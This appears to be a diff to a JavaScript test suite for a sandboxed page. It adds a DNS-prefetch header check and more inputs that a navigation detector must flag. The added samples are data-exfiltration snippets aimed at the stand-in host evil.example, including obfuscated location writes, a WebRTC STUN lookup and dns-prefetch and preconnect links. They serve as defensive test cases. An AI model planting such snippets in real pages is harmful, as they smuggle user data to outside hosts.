@@ -29,6 +29,7 @@ describe('a page, sealed off', () => {
     expect(h['x-frame-options']).toBe('SAMEORIGIN');
     expect(h['x-content-type-options']).toBe('nosniff');
     expect(h['referrer-policy']).toBe('no-referrer');
+    expect(h['x-dns-prefetch-control']).toBe('off');
     expect(frameHeaders(false)['content-security-policy']).toMatch(/script-src 'none'.*sandbox$/);
   });
 
@@ -42,12 +43,24 @@ describe('a page, sealed off', () => {
       '<meta http-equiv="refresh" content="0;url=https://evil.example">',
       '<script>top.location="x"</script>',
       '<iframe src="https://evil.example"></iframe>',
+      // Other spellings of the same thing (review).
+      '<script>location.host = "evil.example"</script>',
+      '<script>document.location.search = "?d=" + x</script>',
+      '<script>navigation.navigate("https://evil.example/?d=" + x)</script>',
+      '<script>self["loc" + "ation"] = "https://evil.example"</script>',
+      '<script>globalThis[k] = u</script>',
+      // What leaves without navigating: a STUN lookup, a DNS prefetch.
+      '<script>new RTCPeerConnection({ iceServers: [{ urls: "stun:" + x + ".evil" }] })</script>',
+      '<link rel="dns-prefetch" href="//secret.evil.example">',
+      '<link rel=preconnect href="https://evil.example">',
     ])
       expect(navigates(bad), bad).toBe(true);
     for (const fine of [
       '<h1>Tip calculator</h1><script>document.getElementById("x").textContent = 1</script>',
       '<a href="#section">Jump</a>',
       '<img src="data:image/png;base64,iVBORw0KGgo=">',
+      '<script>if (location.hash === "#a") rows["total"] = 3; window.addEventListener("resize", f)</script>',
+      '<link rel="stylesheet" href="data:text/css,a{}">',
     ])
       expect(navigates(fine), fine).toBe(false);
   });
